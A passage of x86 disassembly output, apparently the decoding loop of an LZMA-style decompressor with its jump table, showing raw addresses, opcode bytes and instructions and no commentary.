  406b5b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406b5e:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  406b61:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406b64:	40                   	inc    %eax
  406b65:	33 d2                	xor    %edx,%edx
  406b67:	f7 75 8c             	divl   -0x74(%ebp)
  406b6a:	8b 45 98             	mov    -0x68(%ebp),%eax
  406b6d:	ff 45 a0             	incl   -0x60(%ebp)
  406b70:	ff 45 98             	incl   -0x68(%ebp)
  406b73:	ff 4d 9c             	decl   -0x64(%ebp)
  406b76:	88 08                	mov    %cl,(%eax)
  406b78:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406b7b:	c7 85 78 ff ff ff 02 	movl   $0x2,-0x88(%ebp)
  406b82:	00 00 00 
  406b85:	e9 c7 fa ff ff       	jmp    0x406651
  406b8a:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406b8e:	75 05                	jne    0x406b95
  406b90:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406b93:	eb 36                	jmp    0x406bcb
  406b95:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b98:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406b9b:	c7 85 7c ff ff ff 0b 	movl   $0xb,-0x84(%ebp)
  406ba2:	00 00 00 
  406ba5:	8d b4 48 c8 01 00 00 	lea    0x1c8(%eax,%ecx,2),%esi
  406bac:	e9 88 02 00 00       	jmp    0x406e39
  406bb1:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406bb5:	75 05                	jne    0x406bbc
  406bb7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406bba:	eb 09                	jmp    0x406bc5
  406bbc:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406bbf:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406bc2:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  406bc5:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  406bc8:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  406bcb:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  406bce:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406bd1:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  406bd4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406bd7:	c7 45 80 15 00 00 00 	movl   $0x15,-0x80(%ebp)
  406bde:	05 68 0a 00 00       	add    $0xa68,%eax
  406be3:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406be6:	e9 d9 fe ff ff       	jmp    0x406ac4
  406beb:	33 c0                	xor    %eax,%eax
  406bed:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406bf1:	0f 9d c0             	setge  %al
  406bf4:	48                   	dec    %eax
  406bf5:	24 fd                	and    $0xfd,%al
  406bf7:	83 c0 0b             	add    $0xb,%eax
  406bfa:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406bfd:	e9 9a 01 00 00       	jmp    0x406d9c
  406c02:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406c05:	83 f8 04             	cmp    $0x4,%eax
  406c08:	7c 03                	jl     0x406c0d
  406c0a:	6a 03                	push   $0x3
  406c0c:	58                   	pop    %eax
  406c0d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406c10:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  406c17:	c1 e0 07             	shl    $0x7,%eax
  406c1a:	c7 45 84 19 00 00 00 	movl   $0x19,-0x7c(%ebp)
  406c21:	8d 84 08 60 03 00 00 	lea    0x360(%eax,%ecx,1),%eax
  406c28:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406c2b:	e9 ce 02 00 00       	jmp    0x406efe
  406c30:	83 fb 04             	cmp    $0x4,%ebx
  406c33:	7c 34                	jl     0x406c69
  406c35:	8b cb                	mov    %ebx,%ecx
  406c37:	8b c3                	mov    %ebx,%eax
  406c39:	d1 f9                	sar    $1,%ecx
  406c3b:	83 e0 01             	and    $0x1,%eax
  406c3e:	49                   	dec    %ecx
  406c3f:	0c 02                	or     $0x2,%al
  406c41:	d3 e0                	shl    %cl,%eax
  406c43:	83 fb 0e             	cmp    $0xe,%ebx
  406c46:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406c49:	7d 14                	jge    0x406c5f
  406c4b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406c4e:	2b c3                	sub    %ebx,%eax
  406c50:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  406c53:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  406c5a:	e9 81 00 00 00       	jmp    0x406ce0
  406c5f:	33 db                	xor    %ebx,%ebx
  406c61:	83 c1 fc             	add    $0xfffffffc,%ecx
  406c64:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  406c67:	eb 33                	jmp    0x406c9c
  406c69:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  406c6c:	e9 28 01 00 00       	jmp    0x406d99
  406c71:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406c75:	0f 84 98 03 00 00    	je     0x407013
  406c7b:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406c7e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406c81:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406c85:	0f b6 09             	movzbl (%ecx),%ecx
  406c88:	ff 4d 94             	decl   -0x6c(%ebp)
  406c8b:	c1 e0 08             	shl    $0x8,%eax
  406c8e:	0b c1                	or     %ecx,%eax
  406c90:	ff 45 90             	incl   -0x70(%ebp)
  406c93:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406c96:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406c99:	ff 4d b8             	decl   -0x48(%ebp)
  406c9c:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  406ca0:	7e 27                	jle    0x406cc9
  406ca2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406ca5:	03 db                	add    %ebx,%ebx
  406ca7:	d1 6d f0             	shrl   $1,-0x10(%ebp)
  406caa:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  406cad:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406cb0:	72 0c                	jb     0x406cbe
  406cb2:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406cb5:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406cb8:	83 cb 01             	or     $0x1,%ebx
  406cbb:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406cbe:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406cc5:	73 d2                	jae    0x406c99
  406cc7:	eb a8                	jmp    0x406c71
  406cc9:	c1 e3 04             	shl    $0x4,%ebx
  406ccc:	03 c3                	add    %ebx,%eax
  406cce:	c7 45 c0 04 00 00 00 	movl   $0x4,-0x40(%ebp)
  406cd5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406cd8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406cdb:	05 44 06 00 00       	add    $0x644,%eax
  406ce0:	33 db                	xor    %ebx,%ebx
  406ce2:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406ce5:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  406cec:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406cef:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  406cf2:	eb 28                	jmp    0x406d1c
  406cf4:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406cf8:	0f 84 21 03 00 00    	je     0x40701f
  406cfe:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406d01:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406d04:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406d08:	0f b6 09             	movzbl (%ecx),%ecx
  406d0b:	ff 4d 94             	decl   -0x6c(%ebp)
  406d0e:	c1 e0 08             	shl    $0x8,%eax
  406d11:	0b c1                	or     %ecx,%eax
  406d13:	ff 45 90             	incl   -0x70(%ebp)
  406d16:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406d19:	ff 45 b8             	incl   -0x48(%ebp)
  406d1c:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406d1f:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406d22:	7d 72                	jge    0x406d96
  406d24:	8b 45 b0             	mov    -0x50(%ebp),%eax
  406d27:	8b 55 f0             	mov    -0x10(%ebp),%edx
  406d2a:	c1 ea 0b             	shr    $0xb,%edx
  406d2d:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  406d30:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406d33:	8d 34 07             	lea    (%edi,%eax,1),%esi
  406d36:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406d39:	66 8b 06             	mov    (%esi),%ax
  406d3c:	0f b7 c8             	movzwl %ax,%ecx
  406d3f:	0f af d1             	imul   %ecx,%edx
  406d42:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  406d45:	73 17                	jae    0x406d5e
  406d47:	89 55 f0             	mov    %edx,-0x10(%ebp)
  406d4a:	ba 00 08 00 00       	mov    $0x800,%edx
  406d4f:	2b d1                	sub    %ecx,%edx
  406d51:	c1 fa 05             	sar    $0x5,%edx
  406d54:	03 d0                	add    %eax,%edx
  406d56:	d1 65 b0             	shll   $1,-0x50(%ebp)
  406d59:	66 89 16             	mov    %dx,(%esi)
  406d5c:	eb 2a                	jmp    0x406d88
  406d5e:	33 c9                	xor    %ecx,%ecx
  406d60:	29 55 f0             	sub    %edx,-0x10(%ebp)
  406d63:	41                   	inc    %ecx
  406d64:	29 55 f4             	sub    %edx,-0xc(%ebp)
  406d67:	8b d9                	mov    %ecx,%ebx
  406d69:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  406d6c:	d3 e3                	shl    %cl,%ebx
  406d6e:	8b cb                	mov    %ebx,%ecx
  406d70:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406d73:	0b d9                	or     %ecx,%ebx
  406d75:	66 8b c8             	mov    %ax,%cx
  406d78:	66 c1 e9 05          	shr    $0x5,%cx
  406d7c:	2b c1                	sub    %ecx,%eax
  406d7e:	47                   	inc    %edi
  406d7f:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406d82:	66 89 06             	mov    %ax,(%esi)
  406d85:	89 7d b0             	mov    %edi,-0x50(%ebp)
  406d88:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406d8f:	73 88                	jae    0x406d19
  406d91:	e9 5e ff ff ff       	jmp    0x406cf4
  406d96:	01 5d d4             	add    %ebx,-0x2c(%ebp)
  406d99:	ff 45 d4             	incl   -0x2c(%ebp)
  406d9c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406d9f:	85 c0                	test   %eax,%eax
  406da1:	0f 84 84 02 00 00    	je     0x40702b
  406da7:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  406daa:	0f 87 b8 02 00 00    	ja     0x407068
  406db0:	83 45 d0 02          	addl   $0x2,-0x30(%ebp)
  406db4:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406db7:	01 45 a0             	add    %eax,-0x60(%ebp)
  406dba:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406dbe:	0f 84 6d 02 00 00    	je     0x407031
  406dc4:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406dc7:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406dca:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406dcd:	72 03                	jb     0x406dd2
  406dcf:	03 45 8c             	add    -0x74(%ebp),%eax
  406dd2:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406dd5:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406dd8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406ddb:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  406dde:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406de1:	40                   	inc    %eax
  406de2:	33 d2                	xor    %edx,%edx
  406de4:	f7 75 8c             	divl   -0x74(%ebp)
  406de7:	8b 45 98             	mov    -0x68(%ebp),%eax
  406dea:	ff 45 98             	incl   -0x68(%ebp)
  406ded:	ff 4d 9c             	decl   -0x64(%ebp)
  406df0:	ff 4d d0             	decl   -0x30(%ebp)
  406df3:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  406df7:	88 08                	mov    %cl,(%eax)
  406df9:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406dfc:	7f bc                	jg     0x406dba
  406dfe:	e9 78 fd ff ff       	jmp    0x406b7b
  406e03:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406e07:	75 20                	jne    0x406e29
  406e09:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  406e0c:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  406e10:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406e13:	c1 e0 04             	shl    $0x4,%eax
  406e16:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  406e1a:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406e1d:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  406e24:	e9 ce 00 00 00       	jmp    0x406ef7
  406e29:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406e2c:	c7 85 7c ff ff ff 13 	movl   $0x13,-0x84(%ebp)
  406e33:	00 00 00 
  406e36:	8d 70 02             	lea    0x2(%eax),%esi
  406e39:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406e3c:	66 8b 06             	mov    (%esi),%ax
  406e3f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406e42:	0f b7 d0             	movzwl %ax,%edx
  406e45:	c1 e9 0b             	shr    $0xb,%ecx
  406e48:	0f af ca             	imul   %edx,%ecx
  406e4b:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406e4e:	73 18                	jae    0x406e68
  406e50:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406e53:	b9 00 08 00 00       	mov    $0x800,%ecx
  406e58:	2b ca                	sub    %edx,%ecx
  406e5a:	c1 f9 05             	sar    $0x5,%ecx
  406e5d:	03 c8                	add    %eax,%ecx
  406e5f:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406e63:	66 89 0e             	mov    %cx,(%esi)
  406e66:	eb 19                	jmp    0x406e81
  406e68:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406e6b:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406e6e:	66 8b c8             	mov    %ax,%cx
  406e71:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406e78:	66 c1 e9 05          	shr    $0x5,%cx
  406e7c:	2b c1                	sub    %ecx,%eax
  406e7e:	66 89 06             	mov    %ax,(%esi)
  406e81:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406e88:	73 25                	jae    0x406eaf
  406e8a:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406e8e:	0f 84 a9 01 00 00    	je     0x40703d
  406e94:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406e97:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406e9a:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406e9e:	0f b6 09             	movzbl (%ecx),%ecx
  406ea1:	ff 4d 94             	decl   -0x6c(%ebp)
  406ea4:	c1 e0 08             	shl    $0x8,%eax
  406ea7:	0b c1                	or     %ecx,%eax
  406ea9:	ff 45 90             	incl   -0x70(%ebp)
  406eac:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406eaf:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  406eb5:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  406ebb:	e9 91 f7 ff ff       	jmp    0x406651
  406ec0:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406ec4:	75 1c                	jne    0x406ee2
  406ec6:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  406ec9:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406ecc:	c1 e0 04             	shl    $0x4,%eax
  406ecf:	c7 45 d0 08 00 00 00 	movl   $0x8,-0x30(%ebp)
  406ed6:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  406edd:	e9 38 ff ff ff       	jmp    0x406e1a
  406ee2:	81 45 a8 04 02 00 00 	addl   $0x204,-0x58(%ebp)
  406ee9:	c7 45 d0 10 00 00 00 	movl   $0x10,-0x30(%ebp)
  406ef0:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  406ef7:	c7 45 84 14 00 00 00 	movl   $0x14,-0x7c(%ebp)
  406efe:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406f01:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  406f08:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406f0b:	eb 28                	jmp    0x406f35
  406f0d:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406f11:	0f 84 32 01 00 00    	je     0x407049
  406f17:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406f1a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406f1d:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406f21:	0f b6 09             	movzbl (%ecx),%ecx
  406f24:	ff 4d 94             	decl   -0x6c(%ebp)
  406f27:	c1 e0 08             	shl    $0x8,%eax
  406f2a:	0b c1                	or     %ecx,%eax
  406f2c:	ff 45 90             	incl   -0x70(%ebp)
  406f2f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406f32:	ff 4d b8             	decl   -0x48(%ebp)
  406f35:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  406f39:	7e 5e                	jle    0x406f99
  406f3b:	8b 45 b0             	mov    -0x50(%ebp),%eax
  406f3e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406f41:	c1 e9 0b             	shr    $0xb,%ecx
  406f44:	8d 14 00             	lea    (%eax,%eax,1),%edx
  406f47:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406f4a:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406f4d:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406f50:	66 8b 06             	mov    (%esi),%ax
  406f53:	0f b7 f8             	movzwl %ax,%edi
  406f56:	0f af cf             	imul   %edi,%ecx
  406f59:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406f5c:	73 17                	jae    0x406f75
  406f5e:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406f61:	b9 00 08 00 00       	mov    $0x800,%ecx
  406f66:	2b cf                	sub    %edi,%ecx
  406f68:	c1 f9 05             	sar    $0x5,%ecx
  406f6b:	03 c8                	add    %eax,%ecx
  406f6d:	d1 65 b0             	shll   $1,-0x50(%ebp)
  406f70:	66 89 0e             	mov    %cx,(%esi)
  406f73:	eb 16                	jmp    0x406f8b
  406f75:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406f78:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406f7b:	66 8b c8             	mov    %ax,%cx
  406f7e:	66 c1 e9 05          	shr    $0x5,%cx
  406f82:	2b c1                	sub    %ecx,%eax
  406f84:	42                   	inc    %edx
  406f85:	66 89 06             	mov    %ax,(%esi)
  406f88:	89 55 b0             	mov    %edx,-0x50(%ebp)
  406f8b:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406f92:	73 9e                	jae    0x406f32
  406f94:	e9 74 ff ff ff       	jmp    0x406f0d
  406f99:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  406f9c:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  406f9f:	33 c0                	xor    %eax,%eax
  406fa1:	40                   	inc    %eax
  406fa2:	d3 e0                	shl    %cl,%eax
  406fa4:	2b d8                	sub    %eax,%ebx
  406fa6:	8b 45 84             	mov    -0x7c(%ebp),%eax
  406fa9:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406fac:	e9 04 ff ff ff       	jmp    0x406eb5
  406fb1:	01 5d d0             	add    %ebx,-0x30(%ebp)
  406fb4:	8b 45 80             	mov    -0x80(%ebp),%eax
  406fb7:	e9 f9 fe ff ff       	jmp    0x406eb5
  406fbc:	c7 85 78 ff ff ff 01 	movl   $0x1,-0x88(%ebp)
  406fc3:	00 00 00 
  406fc6:	e9 88 00 00 00       	jmp    0x407053
  406fcb:	c7 85 78 ff ff ff 03 	movl   $0x3,-0x88(%ebp)
  406fd2:	00 00 00 
  406fd5:	eb 7c                	jmp    0x407053
  406fd7:	c7 85 78 ff ff ff 0d 	movl   $0xd,-0x88(%ebp)
  406fde:	00 00 00 
  406fe1:	eb 70                	jmp    0x407053
  406fe3:	c7 85 78 ff ff ff 0e 	movl   $0xe,-0x88(%ebp)
  406fea:	00 00 00 
  406fed:	eb 64                	jmp    0x407053
  406fef:	c7 85 78 ff ff ff 0f 	movl   $0xf,-0x88(%ebp)
  406ff6:	00 00 00 
  406ff9:	eb 58                	jmp    0x407053
  406ffb:	c7 85 78 ff ff ff 1a 	movl   $0x1a,-0x88(%ebp)
  407002:	00 00 00 
  407005:	eb 4c                	jmp    0x407053
  407007:	c7 85 78 ff ff ff 1b 	movl   $0x1b,-0x88(%ebp)
  40700e:	00 00 00 
  407011:	eb 40                	jmp    0x407053
  407013:	c7 85 78 ff ff ff 0c 	movl   $0xc,-0x88(%ebp)
  40701a:	00 00 00 
  40701d:	eb 34                	jmp    0x407053
  40701f:	c7 85 78 ff ff ff 10 	movl   $0x10,-0x88(%ebp)
  407026:	00 00 00 
  407029:	eb 28                	jmp    0x407053
  40702b:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  40702f:	eb 22                	jmp    0x407053
  407031:	c7 85 78 ff ff ff 1c 	movl   $0x1c,-0x88(%ebp)
  407038:	00 00 00 
  40703b:	eb 16                	jmp    0x407053
  40703d:	c7 85 78 ff ff ff 05 	movl   $0x5,-0x88(%ebp)
  407044:	00 00 00 
  407047:	eb 0a                	jmp    0x407053
  407049:	c7 85 78 ff ff ff 18 	movl   $0x18,-0x88(%ebp)
  407050:	00 00 00 
  407053:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  407059:	6a 22                	push   $0x22
  40705b:	59                   	pop    %ecx
  40705c:	8d b5 78 ff ff ff    	lea    -0x88(%ebp),%esi
  407062:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407064:	33 c0                	xor    %eax,%eax
  407066:	eb 03                	jmp    0x40706b
  407068:	83 c8 ff             	or     $0xffffffff,%eax
  40706b:	5f                   	pop    %edi
  40706c:	5e                   	pop    %esi
  40706d:	5b                   	pop    %ebx
  40706e:	c9                   	leave
  40706f:	c3                   	ret
  407070:	67 66 40             	addr16 inc %ax
  407073:	00 0c 67             	add    %cl,(%edi,%eiz,2)
  407076:	40                   	inc    %eax
  407077:	00 a7 67 40 00 7c    	add    %ah,0x7c004067(%edi)
  40707d:	67 40                	addr16 inc %eax
  40707f:	00 3c 6e             	add    %bh,(%esi,%ebp,2)
  407082:	40                   	inc    %eax
  407083:	00 8a 6e 40 00 cd    	add    %cl,-0x32ffbf92(%edx)
  407089:	67 40                	addr16 inc %eax
  40708b:	00 6c 6a 40          	add    %ch,0x40(%edx,%ebp,2)
  40708f:	00 d6                	add    %dl,%dh
  407091:	6a 40                	push   $0x40
  407093:	00 19                	add    %bl,(%ecx)
  407095:	6b 40 00 8a          	imul   $0xffffff8a,0x0(%eax),%eax
  407099:	6b 40 00 b1          	imul   $0xffffffb1,0x0(%eax),%eax
  40709d:	6b 40 00 71          	imul   $0x71,0x0(%eax),%eax
  4070a1:	6c                   	insb   (%dx),%es:(%edi)
  4070a2:	40                   	inc    %eax
  4070a3:	00 66 68             	add    %ah,0x68(%esi)
  4070a6:	40                   	inc    %eax
  4070a7:	00 1f                	add    %bl,(%edi)
  4070a9:	69 40 00 e3 69 40 00 	imul   $0x4069e3,0x0(%eax),%eax
  4070b0:	f4                   	hlt
  4070b1:	6c                   	insb   (%dx),%es:(%edi)
  4070b2:	40                   	inc    %eax
  4070b3:	00 c4                	add    %al,%ah
  4070b5:	6a 40                	push   $0x40
  4070b7:	00 03                	add    %al,(%ebx)
  4070b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4070ba:	40                   	inc    %eax
  4070bb:	00 c0                	add    %al,%al
  4070bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4070be:	40                   	inc    %eax
  4070bf:	00 b1 6f 40 00 eb    	add    %dh,-0x14ffbf91(%ecx)
  4070c5:	6b 40 00 02          	imul   $0x2,0x0(%eax),%eax
  4070c9:	6c                   	insb   (%dx),%es:(%edi)
  4070ca:	40                   	inc    %eax
  4070cb:	00 fe                	add    %bh,%dh
  4070cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4070ce:	40                   	inc    %eax
  4070cf:	00 0d 6f 40 00 30    	add    %cl,0x3000406f
  4070d5:	6c                   	insb   (%dx),%es:(%edi)
  4070d6:	40                   	inc    %eax
  4070d7:	00 b2 69 40 00 3d    	add    %dh,0x3d004069(%edx)
  4070dd:	6b 40 00 ba          	imul   $0xffffffba,0x0(%eax),%eax
  4070e1:	6d                   	insl   (%dx),%es:(%edi)
  4070e2:	40                   	inc    %eax
	...
